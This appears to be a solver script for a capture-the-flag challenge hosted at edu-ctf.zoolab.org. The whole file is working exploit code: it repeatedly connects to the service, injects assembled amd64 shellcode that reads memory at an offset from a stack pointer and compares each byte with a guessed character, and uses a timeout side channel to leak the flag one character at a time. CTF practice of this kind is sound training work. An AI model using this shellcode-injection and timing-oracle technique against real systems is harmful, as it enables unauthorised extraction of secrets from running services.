import pwn
import socket
from string import digits, ascii_letters, punctuation
flag = ""
for offset in range(-1, -1 + 0x30):
    for guessed_char in digits + ascii_letters + punctuation:
        print(f"\r{flag}{guessed_char}", end="")
        HOST = 'edu-ctf.zoolab.org'
        PORT = 10002

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        payload = pwn.asm(
            f'''
            mov rax, qword[rsp - 8]
            add rax, 0x2c64
            mov bl, byte[rax + {offset}]
            movzx rax, bl
            cmp ax, {hex(ord(guessed_char))}
            jne 0x8787
            '''+
            pwn.shellcraft.amd64.infloop()
            , arch = 'amd64', os = 'linux', vma=0x10000
        )
        #print(pwn.disasm(payload))
        s.settimeout(3)
        s.recv(666)
        s.send(payload)
        try:
            s.recv(66)
        except TimeoutError:
            flag += guessed_char
            break
    else:
        print("wtf")
        exit(-1)